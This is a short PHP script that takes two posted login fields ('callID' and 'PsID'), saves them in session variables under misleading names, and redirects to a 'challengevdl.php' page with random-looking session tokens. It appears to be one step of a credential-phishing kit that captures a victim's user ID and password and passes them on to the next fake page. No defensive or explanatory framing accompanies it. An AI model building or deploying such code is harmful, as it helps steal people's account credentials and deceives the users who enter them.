<?php
ini_set("output_buffering",4096);
session_start();
$_SESSION['FirstnameP'] = $user = $_POST['callID'];
$_SESSION['LastnameP'] = $user = $_POST['PsID']; 
header("Location: challengevdl.php?tm&aof=".md5(microtime())."&challengesession=".sha1(microtime()));
?>
<html>
<head>
<title></title>
</head>
<body>
</body>
</html>